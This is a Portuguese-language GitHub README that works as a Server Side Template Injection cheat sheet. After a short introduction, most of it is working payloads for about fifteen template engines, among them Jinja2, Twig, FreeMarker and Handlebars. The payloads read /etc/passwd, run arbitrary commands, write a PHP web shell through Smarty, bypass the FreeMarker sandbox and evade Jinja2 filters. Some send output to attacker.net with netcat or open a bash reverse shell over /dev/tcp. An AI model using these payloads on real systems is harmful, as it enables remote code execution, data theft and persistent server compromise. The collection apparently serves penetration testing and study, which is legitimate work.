<h1 align="center">SSTI - Server Side Template Injection</h1>
<p align="center"><h3<i>OHMS<a style="width: 100; height: 100; background-color: red; text-align: center; color: black;"> SEC</a></h3></i></p>
<div align="center">
  <a href="https://github.com/elangosundar/awesome-README-templates/stargazers"><img src="https://img.shields.io/github/stars/elangosundar/awesome-README-templates" alt="Stars Badge"/></a>
<a href="https://github.com/elangosundar/awesome-README-templates/network/members"><img src="https://img.shields.io/github/forks/elangosundar/awesome-README-templates" alt="Forks Badge"/></a>
<a href="https://github.com/elangosundar/awesome-README-templates/pulls"><img src="https://img.shields.io/github/issues-pr/elangosundar/awesome-README-templates" alt="Pull Requests Badge"/></a>
<a href="https://github.com/elangosundar/awesome-README-templates/issues"><img src="https://img.shields.io/github/issues/elangosundar/awesome-README-templates" alt="Issues Badge"/></a>
<a href="https://github.com/elangosundar/awesome-README-templates/graphs/contributors"><img alt="GitHub contributors" src="https://img.shields.io/github/contributors/elangosundar/awesome-README-templates?color=2b9348"></a>
<a href="https://github.com/elangosundar/awesome-README-templates/blob/master/LICENSE"><img src="https://img.shields.io/github/license/elangosundar/awesome-README-templates?color=2b9348" alt="License Badge"/></a>
</div>
<br>
<p align="center"><i>Loved the project? Please visit our <a href=https://www.ohmsec.com.br/">Website</a></i></p>
<br>
Os mecanismos de templates são frequentemente usados em serviços web, tornando a criação do design das páginas HTML mais fácil, deixando o envio das informações de maneira mais simples e organizadas. Quando esses templates não são configurados da forma correta, acaba que a entrada do usuário é passada em modelos e não como dados, permitindo assim a injeção de comandos que acaba se tornando uma vulnerabilidade crítica e que facilmente pode ser confundido com um Cross-Site Scripting (XSS) ou passar despercebida, já que a pessoa testou apenas o XSS. Mas ao contrário do XSS, o SSTI pode ser usado para atacar diretamente os servidores internos da página web, onde podemos obter um Remote Code Execution (RCE). Principais templates usados:

No PHP:

    Plates;
    Blade;
    Twig.

No JavaScript:

    Mustache;
    Handlebars;
    doT;
    EJS;
    PUG;
    Jade Language;
    Squirrelly.

No Python:

    Django Template;
    Genshi;
    Jinja;
    Mako.

No Java:

    Java Server Pages (JSP);
    Thymeleaf;
    FreeMarker.






Ataque

Nesse ponto, você deve saber qual sistema de template está sendo usado para fazer o ataque e ser capaz de prosseguir em busca de vulnerabilidades exploráveis. É importante abordar isso no contexto do aplicativo mais amplo, algumas funções que podem ser usadas para explorar recursos específicos do aplicativo. Abaixo estão as payloads, acionando a criação de objeto arbitrário, leitura/gravação de arquivo arbitrário, inclusão de arquivo remoto, divulgação de informações e vulnerabilidades de escalamento de privilégio.

    Ruby

- Injeções básicas em ERB

<%= 7 * 7 %>

- Injeções básicas em ERB

#{ 7 * 7 }

- Buscar por /etc/passwd

<%= File.open('/etc/passwd').read %>

- Listar arquivos e diretórios

<%= Dir.entries('/') %

- Execução de código ERB:

<%= system('cat /etc/passwd') %>
<%= `ls /` %>
<%= IO.popen('ls /').readlines()  %>
<% require 'open3' %><% @a,@b,@c,@d=Open3.popen3('whoami') %><%= @b.readline()%>
<% require 'open4' %><% @a,@b,@c,@d=Open4.popen4('whoami') %><%= @c.readline()%>

- Execução de código Slim:

#{ %x|env| }

    Java

- injeções básicas

${7*7}
${{7*7}}
${class.getClassLoader()}
${class.getResource("").getPath()}
${class.getResource("../../../../../index.htm").getContent()}

- Procurar as variáveis do sistema

${T(java.lang.System).getenv()}

- Procurar por /etc/passwd

${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}

    Twig

- Injeções básicas

{{7*7}}
{{7*'7'}} would result in 49
{{dump(app)}}
{{app.request.server.all|join(',')}}

- Leitura arbitrária de arquivos

"{{'/etc/passwd'|file_excerpt(1,30)}}"@

- Execução de códigos

{{self}}
{{_self.env.setCache("<ftp://attacker.net:2121>")}}{{_self.env.loadTemplate("backdoor")}}
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{['id']|filter('system')}}
{{['cat\\x20/etc/passwd']|filter('system')}}
{{['cat$IFS/etc/passwd']|filter('system')}}

- Exemplo com um email passando FILTER_VALIDATE_EMAIL PHP.

POST /subscribe?0=cat+/etc/passwd HTTP/1.1
email="{{app.request.query.filter(0,0,1024,{'options':'system'})}}"@attacker.tl

    Smarty

{$smarty.version}
{php}echo `id`;{/php} //deprecated in smarty v3
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
{system('ls')} // compatible v3
{system('cat index.php')} // compatible v3

    Freenarker

- Injeções básicas

${3*3} ou #{3*3}

- Execução de códigos

<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}
${"freemarker.template.utility.Execute"?new()("id")}

- Sandbox bypass (só funciona em versões do Freemarker abaixo de 2.3.30)

<#assign classloader=article.class.protectionDomain.classLoader>
<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
<#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
<#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
${dwf.newInstance(ec,null)("id")}

    Pebble

- Injeções básicas

{{ someString.toUPPERCASE() }}

- Execução de códigos
Versões antigas do 3.0.9 pra baixo:

{{ variable.getClass().forName('java.lang.Runtime').getRuntime().exec('ls -la') }}

Novas versões

{% set cmd = 'id' %}
{% set bytes = (1).TYPE
     .forName('java.lang.Runtime')
     .methods[6]
     .invoke(null,null)
     .exec(cmd)
     .inputStream
     .readAllBytes() %}
{{ (1).TYPE
     .forName('java.lang.String')
     .constructors[0]
     .newInstance(([bytes]).toArray()) }}

    Jade/Codepen

- var x = root.process
- x = x.mainModule.require
- x = x('child_process')
= x.exec('id | nc attacker.net 80')#{root.process.mainModule.require('child_process').spawnSync('cat', ['/etc/passwd']).stdout}

    Velocity

#set($str=$class.inspect("java.lang.String").type)
#set($chr=$class.inspect("java.lang.Character").type)
#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])
$str.valueOf($chr.toChars($out.read()))
#end

    Mako

<%
import os
x=os.popen('id').read()
%>
${x}

    Jinja2

Recomendado estudar SSTI em Jinja2 separado, pois é bem extenso, irei deixar as payloads, mas é um framework interessante de ser estudado.

- Injeções básicas

{{4*4}}[[5*5]]
{{7*'7'}} would result in 7777777
{{config.items()}}

- Debug Statement: Se a extensão debug estiver habilitada, uma tag {% debug%},estará disponível para despejar o contexto atual, bem como os filtros e testes disponíveis. Isso é útil para ver o que está disponível para uso no modelo sem configurar um debug.

<pre>{% debug %}</pre>

- Dump de todas as classes usadas

{{ [].class.base.subclasses() }}
{{''.class.mro()[1].subclasses()}}
{{ ''.__class__.__mro__[2].__subclasses__() }}

- Dump de todas as variáveis de configuração

{% for key, value in config.iteritems() %}
    <dt>{{ key|e }}</dt>
    <dd>{{ value|e }}</dd>
{% endfor %}

- Ler arquivos remotamente

# ''.__class__.__mro__[2].__subclasses__()[40] = File class
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
{{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40]("/tmp/flag").read() }}
# <https://github.com/pallets/flask/blob/master/src/flask/helpers.py#L398>
{{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}

- Gravar arquivo remotamente

{{ ''.__class__.__mro__[2].__subclasses__()[40]('/var/www/html/myflaskapp/hello.txt', 'w').write('Hello here !')

- Execução de códigos remoto

Primeiro iremos escutar a conexão

nc -lnvp 8000

- Explore o SSTI chamando subprocess.Popen. ⚠️ o número 396 varia de acordo com o aplicativo.

{{''.__class__.mro()[1].__subclasses__()[396]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}
{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}

- Explore o SSTI chamando Popen sem adivinhar o deslocamento

{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\"ip\\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\"/bin/cat\\", \\"flag.txt\\"]);'").read().zfill(417)}}{%endif%}{% endfor %}

- Modificação simples da carga útil para limpar a saída e facilitar a entrada do comando

/?cmd={% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}&input=ls

- Em outro parâmetro GET, inclua uma variável chamada “input” que contém o comando que você deseja executar (por exemplo: &input = ls)

{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}

- Explorar, escrevendo um arquivo de configuração maligno

# evil config
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\\n\\nRUNCMD = check_output\\n') }}# load the evil config
{{ config.from_pyfile('/tmp/evilconfig.cfg') }}# connect to evil host
{{ config['RUNCMD']('/bin/bash -c "/bin/bash -i >& /dev/tcp/x.x.x.x/8000 0>&1"',shell=True) }}

- Filtrar o Bypass

request.__class__
request["__class__"]

- Bypassing

<http://localhost:5000/?exploit={{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}>}&class=class&usc=_{{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}
{{request|attr(["_"*2,"class","_"*2]|join)}}
{{request|attr(["__","class","__"]|join)}}
{{request|attr("__class__")}}
{{request.__class__}}

- Bypassing usando colchetes [ ]

<http://localhost:5000/?exploit={{request|attr((request.args.usc*2,request.args.class,request.args.usc*2)|join)}>}&class=class&usc=_
or
<http://localhost:5000/?exploit={{request|attr(request.args.getlist(request.args.l)|join)}>}&l=a&a=_&a=_&a=class&a=_&a=_

- Bypassing | entrada

<http://localhost:5000/?exploit={{request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a))}>}&f=%s%sclass%s%s&a=_

- Ignorando os filtros mais comuns (‘.’, ‘_’, ‘| Join’, ‘[‘, ‘]’, ‘mro’ e ‘base’)

{{request|attr('application')|attr('\\x5f\\x5fglobals\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fbuiltins\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fimport\\x5f\\x5f')('os')|attr('popen')('id')|attr('read')()}}

    Jinjava

- Injeções básicas

{{'a'.toUpperCase()}} would result in 'A'
{{ request }} would return a request object like com.[...].context.TemplateContextRequest@23548206

- Execução de códigos

{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\\"new java.lang.String('xxx')\\")}}{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\\"var x=new java.lang.ProcessBuilder; x.command(\\\\\\"whoami\\\\\\"); x.start()\\")}}{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\\"var x=new java.lang.ProcessBuilder; x.command(\\\\\\"netstat\\\\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\\")}}{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\\"var x=new java.lang.ProcessBuilder; x.command(\\\\\\"uname\\\\\\",\\\\\\"-a\\\\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\\")}}

    Handlebars

{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('ls -la');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}

    ASP.NET Razor

- Injeções básicas

@(1+2)

- Execuções de códigos

@{
  // C# code
}

    Lessjs

- SSRF/LFI

@import (inline) "<http://localhost>";
// or
@import (inline) "/etc/passwd";

- Execuções de códigos

body {
  color: `global.process.mainModule.require("child_process").execSync("id")`;
}
